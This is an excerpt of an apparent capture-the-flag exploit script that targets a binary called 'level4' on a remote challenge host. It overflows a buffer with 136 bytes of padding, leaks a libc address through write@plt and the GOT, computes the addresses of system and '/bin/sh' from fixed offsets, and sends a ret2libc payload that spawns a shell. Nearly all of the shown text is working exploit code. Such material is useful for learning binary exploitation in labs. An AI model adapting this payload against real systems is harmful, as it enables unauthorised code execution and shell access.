...
target: str = './level4'
target_host = ('redirect.do-not-trust.hacking.run', 10235)
...
plt_write = p32(elf.plt['write'])

padding = b'a' * 136 + p32(0xdeadbeaf)
def leak(func_name: str):
    got_addr = p32(elf.got[func_name])
    payload = padding
    # write(fd,content,length)
    payload += plt_write + main_addr + p32(1) + got_addr + p32(0x4)
    sl(payload)
    write_addr = u32(rc(4))
...
offset = write_addr - 0xd44d0 # libc_write
system_addr = p32(0x3a950 + offset)
binsh_addr = p32(0x15912b + offset)

payload = padding + system_addr + main_addr + binsh_addr
sl(payload)
